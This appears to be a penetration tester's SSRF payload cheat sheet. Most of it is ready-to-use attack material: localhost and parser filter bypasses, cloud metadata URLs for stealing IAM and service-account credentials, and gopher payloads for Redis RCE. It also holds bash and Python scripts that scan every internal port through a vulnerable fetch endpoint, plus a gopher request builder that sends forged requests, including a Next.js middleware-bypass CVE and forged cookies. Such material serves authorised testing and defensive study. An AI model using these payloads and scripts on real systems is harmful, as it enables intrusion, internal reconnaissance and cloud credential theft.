---
title: "Payloads: SSRF"
type: payloads
tags: [payloads, ssrf, web, cloud]
sources: [hacktricks-web]
date_created: 2026-06-05
date_updated: 2026-07-14
---

# Payloads: SSRF

Reusable SSRF probes + filter bypasses. Always confirm with OOB (Collaborator/interactsh) - channel setup in [[oob-callbacks]]. See [[ssrf]].

## OOB confirm
```
http://<id>.oob.example
//<id>.oob.example
http://<id>.oob.example/x?a=1
```

## Localhost / internal bypasses
```
http://127.0.0.1        http://127.1            http://0.0.0.0
http://localhost        http://[::1]            http://0177.0.0.1
http://2130706433       http://0x7f000001       http://127.0.0.1.nip.io
http://①②⑦.⓪.⓪.①        http://127。0。0。1
```

## Cloud metadata (high value)
```
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IMDSv2 needs token
curl -H "X-aws-ec2-metadata-token-ttl-seconds: 60" -X PUT http://169.254.169.254/latest/api/token
# GCP (header required)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  (Metadata-Flavor: Google)
# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata: true)
# Alibaba / DO / Oracle
http://100.100.200.200/latest/meta-data/
```

## Redirect / parser bypasses
```
http://attacker/redirect -> 302 -> http://169.254.169.254/...
http://expected.com@169.254.169.254/
http://169.254.169.254#expected.com
http://169.254.169.254\@expected.com
gopher://127.0.0.1:6379/_<redis cmds>      # SSRF -> Redis RCE
dict://127.0.0.1:11211/stats               # memcached
```

## Internal ports to probe
```
6443 k8s api · 2379 etcd · 9200 elastic · 6379 redis · 9090 prometheus · 11211 memcached
3000 node/grafana · 5000 flask/registry · 8000/8080/8888 app · 9000 php-fpm/sonarqube · 10000 webmin/app
```

## Enumerate internal FIRST (the SSRF is your only scanner)
An internal-only service is invisible to external nmap and is usually the objective. Once outbound
is confirmed, sweep the FULL range through the sink and fingerprint each hit (don't stop at "common"):
```bash
T=<target>
# quick bash sweep: non-empty / distinct body = open
for P in $(seq 1 65535); do R=$(curl -s -m3 "http://$T/preview.php?url=http://127.0.0.1:$P/"); [ -n "$R" ] && echo "OPEN $P len=${#R}"; done
```
```python
# threaded version (fast, ~15 workers). Flags open + prints a fingerprint snippet.
import concurrent.futures as cf, subprocess, urllib.parse
T="<target>"
def chk(p):
    r=subprocess.run(['curl','-s','-m','4','http://%s/preview.php?url=%s'%(T,
        urllib.parse.quote('http://127.0.0.1:%d/'%p,safe=''))],capture_output=True).stdout
    if r: return p,len(r),r[:60]
with cf.ThreadPoolExecutor(max_workers=15) as ex:
    for hit in ex.map(chk, range(1,65536)):
        if hit: print('OPEN %d len=%d %r'%hit)
```
Then fingerprint every open port (`<title>`, `Server`/`x-powered-by`, `/_next/static`->Next.js, etc.)
and route it through `playbook.json` BY HAND - recon-capture only fires on external recon output.

## Gopher raw-request builder (send what `?url=` cannot)
`?url=` issues a fixed header-less GET. `gopher://host:port/_<raw-bytes>` sends ANY bytes over a raw
TCP socket = a full HTTP request you craft (arbitrary method/headers/cookies/body). The linchpin
primitive for internal exploitation through a fetch-only SSRF.
```python
import urllib.parse, subprocess, base64
T="<target>"
def gopher(raw: bytes, port: int):                       # raw = complete request bytes
    sel=''.join('%%%02X'%b for b in raw)                 # percent-encode -> gopher selector
    g='gopher://127.0.0.1:%d/_%s'%(port, sel)
    return subprocess.run(['curl','-s','-m','10',
        'http://%s/preview.php?url=%s'%(T, urllib.parse.quote(g, safe=''))],   # encode again for ?url=
        capture_output=True).stdout

def send(method, path, port=80, headers=None, cookie='', body=''):
    h='%s %s HTTP/1.1\r\nHost: 127.0.0.1\r\n'%(method, path)
    for k,v in (headers or {}).items(): h+='%s: %s\r\n'%(k,v)
    if cookie: h+='Cookie: %s\r\n'%cookie
    if method=='POST': h+='Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n'%len(body)
    h+='Connection: close\r\n\r\n'+(body if method=='POST' else '')
    return gopher(h.encode(), port)

# --- examples ---
# 1) header-based CVE: Next.js CVE-2025-29927 middleware bypass (internal app on :10000)
send('GET','/admin',10000, headers={'x-middleware-subrequest':'middleware'})
# 2) HTTP Basic auth to a localhost-only path
ba=base64.b64encode(b'user:pass').decode()
send('GET','/management/',80, headers={'Authorization':'Basic '+ba})
# 3) POST login + reuse the returned session, then send a FORGED cookie (e.g. flip a serialized flag)
send('POST','/management/',80, body='username=admin&password=admin')
```
Gopher = TCP only (services, Redis `gopher://h:6379/_<cmds>`, FastCGI). It cannot read files; for
files you need `file://`/`php://` and those are often keyword-filtered (case-insensitive -> case
tricks won't help).

## URL-format and domain-confusion bypass
Decimal/octal/hex + double-encoding already present above; do not duplicate.
Domain-confusion set (swap attacker.com <-> 127.0.0.1 / target host):
```
https://{target}@attacker.com          https://attacker.com#{target}
https://{target}.attacker.com          https://attacker.com@{target}
https://{target}%6D@attacker.com       https://attacker.com%23@{target}
https://attacker.com\{target}/         https://attacker.com%00{target}
https://attacker.com;https://{target}  https://attacker.com/.{target}
https://attacker.com\@@{target}        https://attacker.com\anything@{target}/
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/    next={target}&next=attacker.com
# colon+backslash parser confusion (CVE-2025-0454 autogpt):
http://localhost:\@google.com/../
# backslash trick (WHATWG treats \ as /):  http://example.com\@169.254.169.254/
```
Domain-parser bypasses (missing scheme slashes / leading junk):
```
https:attacker.com   https:/attacker.com   http:/\/\attacker.com   //attacker.com
\\/\/attacker.com/    /\/attacker.com/      %0D%0A/attacker.com     #attacker.com
attacker%00.com       attacker%E3%80%82com  attacker。com
```
IPv6 zone-identifier trick (filters that stop parsing at `%`):
```
http://[fe80::1%25eth0]/            http://[fe80::a9ff:fe00:1%25en0]/
```
Path / extension requirement bypass:
```
https://metadata/vuln/path#/expected/path
https://metadata/vuln/path#.extension
https://metadata/expected/path/..%2f..%2f/vuln/path
```
DNS-to-localhost / metadata service hostnames (no encoding, resolve to internal):
```
localtest.me                     127.0.0.1.nip.io            spoofed.burpcollaborator.net -> 127.0.0.1
bugbounty.dod.network -> 127.0.0.2   1ynrnhl.xip.io -> 169.254.169.254
customer1.app.localhost.my.company.127.0.0.1.nip.io
```
DNS rebinding (single-resolve filters, 2025): pass a public IP at check time, rebind to
127.0.0.1 / 169.254.169.254 before connect (nccgroup/singularity). Tools: Burp-Encode-IP,
recollapse, SSRF-PayloadMaker, PortSwigger url-validation-bypass cheat sheet.

## Wired sub-techniques

<!-- auto-wired: context-reachable sub-technique pages -->
- [[open-redirect]]
- [[dns-rebinding]]
